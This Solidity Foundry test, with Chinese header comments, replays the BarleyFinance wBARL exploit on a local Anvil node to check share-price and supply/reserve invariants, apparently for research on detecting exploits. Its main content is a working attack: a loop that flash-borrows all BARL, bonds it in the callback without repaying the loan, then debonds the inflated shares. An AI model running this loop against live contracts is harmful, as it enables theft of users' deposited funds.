// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// ============================================================================
// 简化版 BarleyFinance 攻击脚本（本地 Anvil 部署模式）
// ============================================================================
//
// 本脚本用于在本地 Anvil 上验证攻击和不变量检测
//
// 与原始脚本的区别:
// 1. ❌ 移除 vm.createSelectFork - 假设合约已通过 deployment script 部署
// 2. ❌ 移除 Uniswap 交换 - 避免依赖外部流动性池
// 3. ✅ 保留核心攻击逻辑 - flash + bond 循环（这是打破不变量的关键）
// 4. ✅ 添加详细日志 - 记录每个关键步骤的状态
// 5. ✅ 添加不变量检查 - 在攻击前后验证关键指标
//
// 使用方式:
//   1. 启动空白 Anvil: anvil --port 8545
//   2. 部署状态: python generated_deploy/script/2024-01/deploy_BarleyFinance_exp.py
//   3. 运行攻击: forge test --contracts ./src/test/2024-01/BarleyFinance_exp_local.sol --rpc-url http://localhost:8545 -vvv
// ============================================================================

interface IwBARL is IERC20 {
    function flash(address _recipient, address _token, uint256 _amount, bytes memory _data) external;
    function bond(address _token, uint256 _amount) external;
    function debond(uint256 _amount, address[] memory, uint8[] memory) external;
}

contract BarleyFinanceLocalTest is Test {
    // 合约地址（与主网一致）
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant BARL = IERC20(0x3e2324342bF5B8A1Dca42915f0489497203d640E);
    IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IwBARL private constant wBARL = IwBARL(0x04c80Bb477890F3021F03B068238836Ee20aA0b8);

    // 攻击参数
    uint256 constant LOOP_COUNT = 20;  // 循环次数
    uint256 constant DAI_PER_LOOP = 10e18;  // 每次循环使用的 DAI

    function setUp() public {
        // 不需要 fork，假设合约已部署
        // 添加标签以便调试
        vm.label(address(DAI), "DAI");
        vm.label(address(BARL), "BARL");
        vm.label(address(WETH), "WETH");
        vm.label(address(wBARL), "wBARL");
        vm.label(address(this), "AttackContract");
    }

    function testExploit() public {
        console.log("================================================================================");
        console.log("BarleyFinance Attack Test (Local Anvil Mode)");
        console.log("================================================================================");

        // Initialize funds (200 DAI)
        deal(address(DAI), address(this), 200e18);
        console.log("\n[Preparation]");
        console.log("  Initial DAI balance:", DAI.balanceOf(address(this)) / 1e18, "DAI");

        // Record invariants before attack
        console.log("\n[Before Attack] Check Invariants...");
        _logInvariants();

        // Execute core attack: flash + bond loop
        console.log("\n[Attack Phase] Execute flash + bond loop...");
        uint8 i;
        while (i < LOOP_COUNT) {
            console.log("  Loop", uint256(i + 1), "/", LOOP_COUNT);

            // Approve DAI to wBARL (for flash fee payment)
            DAI.approve(address(wBARL), DAI_PER_LOOP);

            // Call flash function, borrow all BARL
            uint256 flashAmount = BARL.balanceOf(address(wBARL));
            wBARL.flash(address(this), address(BARL), flashAmount, "");

            ++i;
        }

        console.log("  Completed");

        // Withdraw all wBARL shares
        console.log("\n[Withdraw Phase] Redeem wBARL shares...");
        uint256 shareBalance = wBARL.balanceOf(address(this));
        console.log("  Holding wBARL shares:", shareBalance / 1e18);

        address[] memory token = new address[](1);
        token[0] = address(BARL);
        uint8[] memory percentage = new uint8[](1);
        percentage[0] = 100;

        wBARL.debond(shareBalance, token, percentage);
        console.log("  Redeemed");

        // Record invariants after attack
        console.log("\n[After Attack] Check Invariants...");
        _logInvariants();

        // Calculate attack profit
        console.log("\n[Result Statistics]");
        uint256 finalBARLBalance = BARL.balanceOf(address(this));
        console.log("  Final BARL balance:", finalBARLBalance / 1e18, "BARL");
        console.log("  Final wBARL balance:", wBARL.balanceOf(address(this)) / 1e18, "wBARL");

        console.log("\n================================================================================");
        console.log("Attack Complete!");
        console.log("================================================================================\n");

        // Assert attack success (obtained BARL)
        assertGt(finalBARLBalance, 0, "Attack failed: No BARL obtained");
    }

    // Flash callback function
    function callback(bytes calldata) external {
        // Execute bond operation in callback
        uint256 barlBalance = BARL.balanceOf(address(this));

        BARL.approve(address(wBARL), barlBalance);
        wBARL.bond(address(BARL), barlBalance);

        // Note: Not repaying flashloan due to vulnerability in wBARL
        // Normally should repay flashAmount + fee
    }

    // Record and check invariants
    function _logInvariants() internal view {
        uint256 totalSupply = wBARL.totalSupply();
        uint256 reserves = BARL.balanceOf(address(wBARL));

        console.log("  ----- Invariant Check -----");
        console.log("  wBARL.totalSupply:", totalSupply / 1e18);
        console.log("  BARL reserves    :", reserves / 1e18);

        if (totalSupply > 0) {
            // Calculate share price (reserves / totalSupply)
            uint256 sharePrice = (reserves * 1e18) / totalSupply;
            console.log("  Share price      :", sharePrice);  // 1e18 = 1.0

            // Calculate supply/reserves ratio
            uint256 ratio = (totalSupply * 100) / reserves;
            console.log("  supply/reserves  :", ratio, "%");

            // Check invariants
            if (ratio > 110) {
                console.log("  WARNING: SINV_002 Violated: supply/reserves ratio", ratio, "% > 110%");
            }

            // Check share price (simplified, only check if deviation from 1.0 is too large)
            if (sharePrice < 0.95e18 || sharePrice > 1.05e18) {
                console.log("  WARNING: SINV_001 May Be Violated: share price", sharePrice, "deviates from 1.0");
            }
        } else {
            console.log("  Share price      : N/A (totalSupply = 0)");
            console.log("  supply/reserves  : N/A (totalSupply = 0)");
        }

        console.log("  ---------------------------");
    }
}
